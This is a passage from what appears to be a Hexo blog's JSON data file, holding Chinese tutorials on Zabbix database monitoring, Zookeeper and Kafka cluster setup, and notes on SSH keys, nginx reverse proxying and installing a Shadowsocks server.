class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">database</span> zabbix <span class=\"built_in\">character</span> <span class=\"keyword\">set</span> utf8 <span class=\"keyword\">collate</span> utf8_bin;</span><br><span class=\"line\"><span class=\"keyword\">grant</span> all <span class=\"keyword\">privileges</span> <span class=\"keyword\">on</span> zabbix.* <span class=\"keyword\">to</span> <span class=\"string\">'zabbix'</span>@<span class=\"string\">'localhost'</span>;</span><br><span class=\"line\"><span class=\"keyword\">flush</span> <span class=\"keyword\">privileges</span>;</span><br><span class=\"line\">exit;</span><br></pre></td></tr></table></figure>\n<p>找到<code>zabbix-server-mysql</code>文件夹，文件夹中是zabbix数据库数据填充文件用来填充数据库<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">zcat *.sql.gz | mysql -uzabbix -p zabbix</span><br></pre></td></tr></table></figure></p>\n<p>如果是三个sql文件，填充顺序是<code>schema.sql.gz</code>-&gt;<code>images.sql.gz</code>-&gt;<code>data.sql</code></p>\n<h2 id=\"配置PHP\"><a href=\"#配置PHP\" class=\"headerlink\" title=\"配置PHP\"></a>配置PHP</h2><p>按照需要修改<code>php.ini</code>配置项</p>\n<h2 id=\"Zabbix-web\"><a href=\"#Zabbix-web\" class=\"headerlink\" title=\"Zabbix web\"></a>Zabbix web</h2><p><strong>将Zabbix的web页面文件拷贝到LNMP的指定目录，启动<code>Zabbix-server</code>进入<code>http://ip/zabbix</code>按步骤填写相关信息，最后成功安上，最后再配合客户端进行监控</strong></p>\n<h2 id=\"Zabbix-检测数据库\"><a href=\"#Zabbix-检测数据库\" class=\"headerlink\" title=\"Zabbix 检测数据库\"></a>Zabbix 检测数据库</h2><p><strong>首先在Zabbix网页上为host添加一个数据库模块，然后需要修改客户端数据，在客户端的<code>/etc/zabbix/zabbix-agentd.d/userparameter_mysql.conf</code>文件中根据文件指示将文件中所有HOME变量换为含有数据库连接文件<code>.my.cnf</code>的目录，我暂时将<code>.my.cnf</code>放在<code>/etc/zabbix</code>下面，然后编写<code>.my.cnf</code></strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[mysql]</span><br><span class=\"line\">user=zabbix</span><br><span class=\"line\">password=zabbix</span><br><span class=\"line\">host=localhost</span><br><span class=\"line\"></span><br><span class=\"line\">[mysqladmin]</span><br><span class=\"line\">user=zabbix</span><br><span class=\"line\">password=zabbix</span><br><span class=\"line\">host=localhost</span><br></pre></td></tr></table></figure></p>\n<p><strong>最后也是最重要的一步，重启数据库，上面步骤都做了，但网页上数据没有更新，原因就是数据库没有重启</strong></p>\n<h2 id=\"附言\"><a href=\"#附言\" class=\"headerlink\" title=\"附言\"></a>附言</h2><p><strong>写得很草率，还在学习中，会努力更新….</strong></p>"},{"title":"Zookeeper Kafka 安装","date":"2017-11-29T07:44:18.000Z","_content":"\n## Zookeeper 安装\n\n### 下载Zookeeper\n官方下载地址[https://zookeeper.apache.org/releases.html](https://zookeeper.apache.org/releases.html)\n\n### 环境搭建\n1. 解压下载包，并将解压的目录重命名为zookeeper\n2. 将 `zookeeper/conf/zoo_sample.cfg` 拷贝一份命名为 `zoo.cfg`\n3. zoo.cfg配置\n\n<!--more-->\n\n``` bash\n# The number of milliseconds of each tick\ntickTime=2000\n# The number of ticks that the initial\n# synchronization phase can take\ninitLimit=10\n# The number of ticks that can pass between\n# sending a request and getting an acknowledgement\nsyncLimit=5\n# the directory where the snapshot is stored.\n# do not use /tmp for storage, /tmp here is just\n# example sakes.\ndataDir=~/zookeeper/data\ndataLogDir=~/zookeeper/logs\n# the port at which the clients will connect\nclientPort=2181\n# the maximum number of client connections.\n# increase this if you need to handle more clients\n#maxClientCnxns=60\n#\n# Be sure to read the maintenance section of the\n# administrator guide before turning on autopurge.\n#\n# http://zookeeper.apache.org/doc/current/zookeeperAdmin.html#sc_maintenance\n#\n# The number of snapshots to retain in dataDir\n#autopurge.snapRetainCount=3\n# Purge task interval in hours\n# Set to \"0\" to disable auto purge feature\n#autopurge.purgeInterval=1\n\nserver.1=kafka-server1:2888:3888\nserver.2=kafka-server2:2888:3888\n```\n> 配置文件中的`dataDir`和`dataLogDir`最好设置在zookeeper目录下，并在集群中每台主机的这两个目录下写一个`myid`文件，文件内容为集群中每台主机对应的集群编号，编号与配置文件`zoo.cfg`最后两行对应，即kafka-server1这台主机的编号为`1`，kafka-server2`的编号为`2`。\n\n\n4. 在每台主机上`zookeeper/bin`目录下运行`./zkSever.sh start`启动集群。\n5. 在每台主机上`zookeeper/bin`目录下运行`./zkServer.sh status`查看状态。\n> 启动成功为看到集群中一台主机为`leader`其他主机为`follower`，如果启动失败，会提示`not running`\n6. 每台主机上`zookeeper/bin`目录下运行`./zkServer.sh stop`关闭集群\n\n\n## kafka 安装\n\n### 下载kafka\n官方下载地址[https://kafka.apache.org/](https://kafka.apache.org/)\n\n### 环境搭建\nkafka依赖于zookeeper管理，因此安装kafka要先安装zookeeper并确保zookeeper安装成功，同样启动kafka要先启动zookeeper\n1. 配置`server.properties`\n`server.properties`中修改三个配置: `breker.id`设置为该主机在zookeeper集群中的编号; `listeners`监听该主机的9092端口，具体值在配置文件中有提示; `zookeeper.connect`设置为zookeeper集群，例如`kakfa-server1:2181,kafka-server2:2181`\n\n2. 配置`producer.properties`\n`producer.properties`中配置`bootstrap.servers`为`kafka-server1:9092,kafka-server2:9092`\n\n3. 配置`consumer.properties`\n`consumer.properties`中配置`zookeeper.connect`为`kakfa-server1:2181,kafka-server2:2181`\n4. 每台主机启动kafka\n``` bash\nbin/kafka-server-start.sh -daemon config/server.properties\n```\n5. 每台主机关闭kafka\n``` bash\nbin/kafka-server-stop\n```\n\n## zookeeper and kafka\n启动集群时，先启动zookeeper，再启动kafka；关闭集群时先关闭kafka，再关闭zookeeper\n\n## 建议\n集群是否搭建成功关键在于有没有比较清楚的了解zookeeper和kafka，网上教程很多，照搬网上教程是大忌，要充分理解配置的意义，诸如`kafka-server1``kafka-server2`在集群通信问题，以及部分教程要求修改`/etc/hosts`的目的。没有充分理解配置，配置集群是一条漫长而迷茫的路。如果在linux中配置过一些东西，会有相当多的经验，经验也很重要。","source":"_posts/zookeeper-kafka.md","raw":"---\ntitle: Zookeeper Kafka 安装\ndate: 2017-11-29 15:44:18\ncategories: 分布式计算\ntags:\n  - Zookeeper\n  - Kafka\n---\n\n## Zookeeper 安装\n\n### 下载Zookeeper\n官方下载地址[https://zookeeper.apache.org/releases.html](https://zookeeper.apache.org/releases.html)\n\n### 环境搭建\n1. 解压下载包，并将解压的目录重命名为zookeeper\n2. 将 `zookeeper/conf/zoo_sample.cfg` 拷贝一份命名为 `zoo.cfg`\n3. zoo.cfg配置\n\n<!--more-->\n\n``` bash\n# The number of milliseconds of each tick\ntickTime=2000\n# The number of ticks that the initial\n# synchronization phase can take\ninitLimit=10\n# The number of ticks that can pass between\n# sending a request and getting an acknowledgement\nsyncLimit=5\n# the directory where the snapshot is stored.\n# do not use /tmp for storage, /tmp here is just\n# example sakes.\ndataDir=~/zookeeper/data\ndataLogDir=~/zookeeper/logs\n# the port at which the clients will connect\nclientPort=2181\n# the maximum number of client connections.\n# increase this if you need to handle more clients\n#maxClientCnxns=60\n#\n# Be sure to read the maintenance section of the\n# administrator guide before turning on autopurge.\n#\n# http://zookeeper.apache.org/doc/current/zookeeperAdmin.html#sc_maintenance\n#\n# The number of snapshots to retain in dataDir\n#autopurge.snapRetainCount=3\n# Purge task interval in hours\n# Set to \"0\" to disable auto purge feature\n#autopurge.purgeInterval=1\n\nserver.1=kafka-server1:2888:3888\nserver.2=kafka-server2:2888:3888\n```\n> 配置文件中的`dataDir`和`dataLogDir`最好设置在zookeeper目录下，并在集群中每台主机的这两个目录下写一个`myid`文件，文件内容为集群中每台主机对应的集群编号，编号与配置文件`zoo.cfg`最后两行对应，即kafka-server1这台主机的编号为`1`，kafka-server2`的编号为`2`。\n\n\n4. 在每台主机上`zookeeper/bin`目录下运行`./zkSever.sh start`启动集群。\n5. 在每台主机上`zookeeper/bin`目录下运行`./zkServer.sh status`查看状态。\n> 启动成功为看到集群中一台主机为`leader`其他主机为`follower`，如果启动失败，会提示`not running`\n6. 每台主机上`zookeeper/bin`目录下运行`./zkServer.sh stop`关闭集群\n\n\n## kafka 安装\n\n### 下载kafka\n官方下载地址[https://kafka.apache.org/](https://kafka.apache.org/)\n\n### 环境搭建\nkafka依赖于zookeeper管理，因此安装kafka要先安装zookeeper并确保zookeeper安装成功，同样启动kafka要先启动zookeeper\n1. 配置`server.properties`\n`server.properties`中修改三个配置: `breker.id`设置为该主机在zookeeper集群中的编号; `listeners`监听该主机的9092端口，具体值在配置文件中有提示; `zookeeper.connect`设置为zookeeper集群，例如`kakfa-server1:2181,kafka-server2:2181`\n\n2. 配置`producer.properties`\n`producer.properties`中配置`bootstrap.servers`为`kafka-server1:9092,kafka-server2:9092`\n\n3. 配置`consumer.properties`\n`consumer.properties`中配置`zookeeper.connect`为`kakfa-server1:2181,kafka-server2:2181`\n4. 每台主机启动kafka\n``` bash\nbin/kafka-server-start.sh -daemon config/server.properties\n```\n5. 每台主机关闭kafka\n``` bash\nbin/kafka-server-stop\n```\n\n## zookeeper and kafka\n启动集群时，先启动zookeeper，再启动kafka；关闭集群时先关闭kafka，再关闭zookeeper\n\n## 建议\n集群是否搭建成功关键在于有没有比较清楚的了解zookeeper和kafka，网上教程很多，照搬网上教程是大忌，要充分理解配置的意义，诸如`kafka-server1``kafka-server2`在集群通信问题，以及部分教程要求修改`/etc/hosts`的目的。没有充分理解配置，配置集群是一条漫长而迷茫的路。如果在linux中配置过一些东西，会有相当多的经验，经验也很重要。","slug":"zookeeper-kafka","published":1,"updated":"2017-11-30T11:30:07.513Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsczz0035yp0l6mf3y2gk","content":"<h2 id=\"Zookeeper-安装\"><a href=\"#Zookeeper-安装\" class=\"headerlink\" title=\"Zookeeper 安装\"></a>Zookeeper 安装</h2><h3 id=\"下载Zookeeper\"><a href=\"#下载Zookeeper\" class=\"headerlink\" title=\"下载Zookeeper\"></a>下载Zookeeper</h3><p>官方下载地址<a href=\"https://zookeeper.apache.org/releases.html\" target=\"_blank\" rel=\"external\">https://zookeeper.apache.org/releases.html</a></p>\n<h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><ol>\n<li>解压下载包，并将解压的目录重命名为zookeeper</li>\n<li>将 <code>zookeeper/conf/zoo_sample.cfg</code> 拷贝一份命名为 <code>zoo.cfg</code></li>\n<li>zoo.cfg配置</li>\n</ol>\n<a id=\"more\"></a>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># The number of milliseconds of each tick</span></span><br><span class=\"line\">tickTime=2000</span><br><span class=\"line\"><span class=\"comment\"># The number of ticks that the initial</span></span><br><span class=\"line\"><span class=\"comment\"># synchronization phase can take</span></span><br><span class=\"line\">initLimit=10</span><br><span class=\"line\"><span class=\"comment\"># The number of ticks that can pass between</span></span><br><span class=\"line\"><span class=\"comment\"># sending a request and getting an acknowledgement</span></span><br><span class=\"line\">syncLimit=5</span><br><span class=\"line\"><span class=\"comment\"># the directory where the snapshot is stored.</span></span><br><span class=\"line\"><span class=\"comment\"># do not use /tmp for storage, /tmp here is just</span></span><br><span class=\"line\"><span class=\"comment\"># example sakes.</span></span><br><span class=\"line\">dataDir=~/zookeeper/data</span><br><span class=\"line\">dataLogDir=~/zookeeper/logs</span><br><span class=\"line\"><span class=\"comment\"># the port at which the clients will connect</span></span><br><span class=\"line\">clientPort=2181</span><br><span class=\"line\"><span class=\"comment\"># the maximum number of client connections.</span></span><br><span class=\"line\"><span class=\"comment\"># increase this if you need to handle more clients</span></span><br><span class=\"line\"><span class=\"comment\">#maxClientCnxns=60</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Be sure to read the maintenance section of the</span></span><br><span class=\"line\"><span class=\"comment\"># administrator guide before turning on autopurge.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># http://zookeeper.apache.org/doc/current/zookeeperAdmin.html#sc_maintenance</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The number of snapshots to retain in dataDir</span></span><br><span class=\"line\"><span class=\"comment\">#autopurge.snapRetainCount=3</span></span><br><span class=\"line\"><span class=\"comment\"># Purge task interval in hours</span></span><br><span class=\"line\"><span class=\"comment\"># Set to \"0\" to disable auto purge feature</span></span><br><span class=\"line\"><span class=\"comment\">#autopurge.purgeInterval=1</span></span><br><span class=\"line\"></span><br><span class=\"line\">server.1=kafka-server1:2888:3888</span><br><span class=\"line\">server.2=kafka-server2:2888:3888</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>配置文件中的<code>dataDir</code>和<code>dataLogDir</code>最好设置在zookeeper目录下，并在集群中每台主机的这两个目录下写一个<code>myid</code>文件，文件内容为集群中每台主机对应的集群编号，编号与配置文件<code>zoo.cfg</code>最后两行对应，即kafka-server1这台主机的编号为<code>1</code>，kafka-server2<code>的编号为</code>2`。</p>\n</blockquote>\n<ol>\n<li>在每台主机上<code>zookeeper/bin</code>目录下运行<code>./zkSever.sh start</code>启动集群。</li>\n<li>在每台主机上<code>zookeeper/bin</code>目录下运行<code>./zkServer.sh status</code>查看状态。<blockquote>\n<p>启动成功为看到集群中一台主机为<code>leader</code>其他主机为<code>follower</code>，如果启动失败，会提示<code>not running</code></p>\n</blockquote>\n</li>\n<li>每台主机上<code>zookeeper/bin</code>目录下运行<code>./zkServer.sh stop</code>关闭集群</li>\n</ol>\n<h2 id=\"kafka-安装\"><a href=\"#kafka-安装\" class=\"headerlink\" title=\"kafka 安装\"></a>kafka 安装</h2><h3 id=\"下载kafka\"><a href=\"#下载kafka\" class=\"headerlink\" title=\"下载kafka\"></a>下载kafka</h3><p>官方下载地址<a href=\"https://kafka.apache.org/\" target=\"_blank\" rel=\"external\">https://kafka.apache.org/</a></p>\n<h3 id=\"环境搭建-1\"><a href=\"#环境搭建-1\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><p>kafka依赖于zookeeper管理，因此安装kafka要先安装zookeeper并确保zookeeper安装成功，同样启动kafka要先启动zookeeper</p>\n<ol>\n<li><p>配置<code>server.properties</code><br><code>server.properties</code>中修改三个配置: <code>breker.id</code>设置为该主机在zookeeper集群中的编号; <code>listeners</code>监听该主机的9092端口，具体值在配置文件中有提示; <code>zookeeper.connect</code>设置为zookeeper集群，例如<code>kakfa-server1:2181,kafka-server2:2181</code></p>\n</li>\n<li><p>配置<code>producer.properties</code><br><code>producer.properties</code>中配置<code>bootstrap.servers</code>为<code>kafka-server1:9092,kafka-server2:9092</code></p>\n</li>\n<li><p>配置<code>consumer.properties</code><br><code>consumer.properties</code>中配置<code>zookeeper.connect</code>为<code>kakfa-server1:2181,kafka-server2:2181</code></p>\n</li>\n<li><p>每台主机启动kafka</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin/kafka-server-start.sh -daemon config/server.properties</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>每台主机关闭kafka</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin/kafka-server-stop</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"zookeeper-and-kafka\"><a href=\"#zookeeper-and-kafka\" class=\"headerlink\" title=\"zookeeper and kafka\"></a>zookeeper and kafka</h2><p>启动集群时，先启动zookeeper，再启动kafka；关闭集群时先关闭kafka，再关闭zookeeper</p>\n<h2 id=\"建议\"><a href=\"#建议\" class=\"headerlink\" title=\"建议\"></a>建议</h2><p>集群是否搭建成功关键在于有没有比较清楚的了解zookeeper和kafka，网上教程很多，照搬网上教程是大忌，要充分理解配置的意义，诸如<code>kafka-server1``kafka-server2</code>在集群通信问题，以及部分教程要求修改<code>/etc/hosts</code>的目的。没有充分理解配置，配置集群是一条漫长而迷茫的路。如果在linux中配置过一些东西，会有相当多的经验，经验也很重要。</p>\n","excerpt":"<h2 id=\"Zookeeper-安装\"><a href=\"#Zookeeper-安装\" class=\"headerlink\" title=\"Zookeeper 安装\"></a>Zookeeper 安装</h2><h3 id=\"下载Zookeeper\"><a href=\"#下载Zookeeper\" class=\"headerlink\" title=\"下载Zookeeper\"></a>下载Zookeeper</h3><p>官方下载地址<a href=\"https://zookeeper.apache.org/releases.html\">https://zookeeper.apache.org/releases.html</a></p>\n<h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><ol>\n<li>解压下载包，并将解压的目录重命名为zookeeper</li>\n<li>将 <code>zookeeper/conf/zoo_sample.cfg</code> 拷贝一份命名为 <code>zoo.cfg</code></li>\n<li>zoo.cfg配置</li>\n</ol>","more":"<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># The number of milliseconds of each tick</span></span><br><span class=\"line\">tickTime=2000</span><br><span class=\"line\"><span class=\"comment\"># The number of ticks that the initial</span></span><br><span class=\"line\"><span class=\"comment\"># synchronization phase can take</span></span><br><span class=\"line\">initLimit=10</span><br><span class=\"line\"><span class=\"comment\"># The number of ticks that can pass between</span></span><br><span class=\"line\"><span class=\"comment\"># sending a request and getting an acknowledgement</span></span><br><span class=\"line\">syncLimit=5</span><br><span class=\"line\"><span class=\"comment\"># the directory where the snapshot is stored.</span></span><br><span class=\"line\"><span class=\"comment\"># do not use /tmp for storage, /tmp here is just</span></span><br><span class=\"line\"><span class=\"comment\"># example sakes.</span></span><br><span class=\"line\">dataDir=~/zookeeper/data</span><br><span class=\"line\">dataLogDir=~/zookeeper/logs</span><br><span class=\"line\"><span class=\"comment\"># the port at which the clients will connect</span></span><br><span class=\"line\">clientPort=2181</span><br><span class=\"line\"><span class=\"comment\"># the maximum number of client connections.</span></span><br><span class=\"line\"><span class=\"comment\"># increase this if you need to handle more clients</span></span><br><span class=\"line\"><span class=\"comment\">#maxClientCnxns=60</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Be sure to read the maintenance section of the</span></span><br><span class=\"line\"><span class=\"comment\"># administrator guide before turning on autopurge.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># http://zookeeper.apache.org/doc/current/zookeeperAdmin.html#sc_maintenance</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The number of snapshots to retain in dataDir</span></span><br><span class=\"line\"><span class=\"comment\">#autopurge.snapRetainCount=3</span></span><br><span class=\"line\"><span class=\"comment\"># Purge task interval in hours</span></span><br><span class=\"line\"><span class=\"comment\"># Set to \"0\" to disable auto purge feature</span></span><br><span class=\"line\"><span class=\"comment\">#autopurge.purgeInterval=1</span></span><br><span class=\"line\"></span><br><span class=\"line\">server.1=kafka-server1:2888:3888</span><br><span class=\"line\">server.2=kafka-server2:2888:3888</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>配置文件中的<code>dataDir</code>和<code>dataLogDir</code>最好设置在zookeeper目录下，并在集群中每台主机的这两个目录下写一个<code>myid</code>文件，文件内容为集群中每台主机对应的集群编号，编号与配置文件<code>zoo.cfg</code>最后两行对应，即kafka-server1这台主机的编号为<code>1</code>，kafka-server2<code>的编号为</code>2`。</p>\n</blockquote>\n<ol>\n<li>在每台主机上<code>zookeeper/bin</code>目录下运行<code>./zkSever.sh start</code>启动集群。</li>\n<li>在每台主机上<code>zookeeper/bin</code>目录下运行<code>./zkServer.sh status</code>查看状态。<blockquote>\n<p>启动成功为看到集群中一台主机为<code>leader</code>其他主机为<code>follower</code>，如果启动失败，会提示<code>not running</code></p>\n</blockquote>\n</li>\n<li>每台主机上<code>zookeeper/bin</code>目录下运行<code>./zkServer.sh stop</code>关闭集群</li>\n</ol>\n<h2 id=\"kafka-安装\"><a href=\"#kafka-安装\" class=\"headerlink\" title=\"kafka 安装\"></a>kafka 安装</h2><h3 id=\"下载kafka\"><a href=\"#下载kafka\" class=\"headerlink\" title=\"下载kafka\"></a>下载kafka</h3><p>官方下载地址<a href=\"https://kafka.apache.org/\">https://kafka.apache.org/</a></p>\n<h3 id=\"环境搭建-1\"><a href=\"#环境搭建-1\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><p>kafka依赖于zookeeper管理，因此安装kafka要先安装zookeeper并确保zookeeper安装成功，同样启动kafka要先启动zookeeper</p>\n<ol>\n<li><p>配置<code>server.properties</code><br><code>server.properties</code>中修改三个配置: <code>breker.id</code>设置为该主机在zookeeper集群中的编号; <code>listeners</code>监听该主机的9092端口，具体值在配置文件中有提示; <code>zookeeper.connect</code>设置为zookeeper集群，例如<code>kakfa-server1:2181,kafka-server2:2181</code></p>\n</li>\n<li><p>配置<code>producer.properties</code><br><code>producer.properties</code>中配置<code>bootstrap.servers</code>为<code>kafka-server1:9092,kafka-server2:9092</code></p>\n</li>\n<li><p>配置<code>consumer.properties</code><br><code>consumer.properties</code>中配置<code>zookeeper.connect</code>为<code>kakfa-server1:2181,kafka-server2:2181</code></p>\n</li>\n<li><p>每台主机启动kafka</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin/kafka-server-start.sh -daemon config/server.properties</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>每台主机关闭kafka</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin/kafka-server-stop</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"zookeeper-and-kafka\"><a href=\"#zookeeper-and-kafka\" class=\"headerlink\" title=\"zookeeper and kafka\"></a>zookeeper and kafka</h2><p>启动集群时，先启动zookeeper，再启动kafka；关闭集群时先关闭kafka，再关闭zookeeper</p>\n<h2 id=\"建议\"><a href=\"#建议\" class=\"headerlink\" title=\"建议\"></a>建议</h2><p>集群是否搭建成功关键在于有没有比较清楚的了解zookeeper和kafka，网上教程很多，照搬网上教程是大忌，要充分理解配置的意义，诸如<code>kafka-server1``kafka-server2</code>在集群通信问题，以及部分教程要求修改<code>/etc/hosts</code>的目的。没有充分理解配置，配置集群是一条漫长而迷茫的路。如果在linux中配置过一些东西，会有相当多的经验，经验也很重要。</p>"},{"title":"分享会资料","date":"2017-12-11T07:18:23.000Z","_content":"## ssh\n1. ssh服务端、客户端(ssh.config/sshd.config)端口修改\n2. ssh公钥私钥(authorized/id_rsa/id_rsa.pub)\n\t- 远程主机收到用户的登录请求，把自己的公钥发给用户\n\t- 用户使用这个公钥，将登录密码加密后，发送回来\n\t- 远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录\n3. ssh免密(公钥)登录\n\t- 用户将自己的公钥储存在远程主机上。\n\t- 登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。\n\t- 远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码\n\n<!--more-->\n\n## hosts文件问题\n为新租的 vps 设置简单的别名访问\n修改新租的 vps 中 hosts 文件，将百度域名转址为本机\n\n## Web服务器\nWeb服务器可以解析HTTP协议。当Web服务器接收到一个HTTP请求,会返回一个HTTP响应,例如送回一个HTML页面。为了处理一个请求Web服务器可以响应一个静态页面或图片，进行页面跳转或者把动态响应的产生委托给一些其它的程序例如CGI脚本，JSP脚本，servlets，ASP脚本，服务器端JavaScript，或者一些其它的服务器端技术。无论它们(译者注：脚本)的目的如何，这些服务器端的程序通常产生一个HTML的响应来让浏览器可以浏览。\n![](/images/WebServer.png)\n### apache vs. nginx\n- `nginx`优点\n\t- 轻量级，起 web 服务，比 apache 占用更少的内存及资源\n\t- 抗并发，nginx 处理请求是异步非阻塞的，而 apache 则是阻塞型的，在高并发下 nginx 能保持低资源低消耗高性能\n\t- 高度模块化的设计，编写模块相对简单\n\t- 社区活跃，各种高性能模块出品迅速\n- `apache`优点\n\t- rewrite ，比 nginx 的 rewrite 强大\n\t- 模块超多，基本想到的都可以找到\n\t- 少bug ，nginx 的 bug 相对较多\n\t- 非常稳定\n\n> apache是同步多进程模型，一个连接对应一个进程；nginx是异步的，多个连接（万级别）可以对应一个进程\n\n### nginx虚拟主机\n基于端口的虚拟主机\n基于域名的虚拟主机\n\n### nginx反向代理\n**反向代理**方式是指用代理服务器来接受 internet 上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 internet 上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。\n\n举个例子，一个用户访问 http://www.example.com/readme ，但是 www.example.com 上并不存在 readme 页面，它是偷偷从另外一台服务器上取回来，然后作为自己的内容返回给用户。但是用户并不知情这个过程。对用户来说，就像是直接从 www.example.com 获取 readme 页面一样。这里所提到的 www.example.com 这个域名对应的服务器就设置了反向代理功能。\n\n![](http://upload-images.jianshu.io/upload_images/3257886-9188ef03eca4816f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700)\n\n``` bash\nhttp {\n    include mime.types;\n    server_tokens off;\n\n\t## 下面配置反向代理的参数\n    server {\n        listen    80;\n\n        ## 1. 用户访问 http://ip:port，则反向代理到 https://github.com\n        location / {\n            proxy_pass  https://github.com;\n            proxy_redirect     off;\n            proxy_set_header   Host             $host;\n            proxy_set_header   X-Real-IP        $remote_addr;\n            proxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;\n        }\n\n        ## 2.用户访问 http://ip:port/README.md，则反向代理到\n        ##   https://github.com/.../README.md\n        location /README.md {\n            proxy_set_header  X-Real-IP  $remote_addr;\n            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n            proxy_pass https://github.com/moonbingbing/openresty-best-practices/blob/master/README.md;\n        }\n    }\n}\n```\n\n### 正向代理\n**正向代理**就像一个跳板，例如一个用户访问不了某网站（例如 www.google.com ），但是他能访问一个代理服务器，这个代理服务器能访问 www.google.com ，于是用户可以先连上代理服务器，告诉它需要访问的内容，代理服务器去取回来返回给用户。例如一些常见的翻墙工具、游戏代理就是利用正向代理的原理工作的。\n![](http://upload-images.jianshu.io/upload_images/3257886-b0ae8b42686a1424.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700)\n\n\n### 安装 Shadowsocks Server\n1. 安装`python-pip`\n``` bash\nyum install python-pip\n```\n2. 安装`shadowsocks`\n``` bash\npip install shadowsocks\n```\n3. 配置 config.json\n``` json\n{\n\t\"server\":\"0.0.0.0\",\n\t\"server_port\":11210,\n\t\"local_address\":\"127.0.0.1\",\n\t\"local_port\":1080,\n\t\"password\":\"*******\",\n\t\"timeout\":600,\n\t\"method\":\"aes-256-cfb\",\n\t\"fast_open\": false,\n\t\"workers\": 1\n}\n```\n4. 运行 Shadowsocks server 脚本参数，设置配置文件路径\n5. 设置`rc.local`里设置开机运行","source":"_posts/分享会资料.md","raw":"---\ntitle: 分享会资料\ndate: 2017-12-11 15:18:23\ncategories: Web服务器\ntag:\n  - apache\n  - nginx\n  - Shadowsocks\n---\n## ssh\n1. ssh服务端、客户端(ssh.config/sshd.config)端口修改\n2. 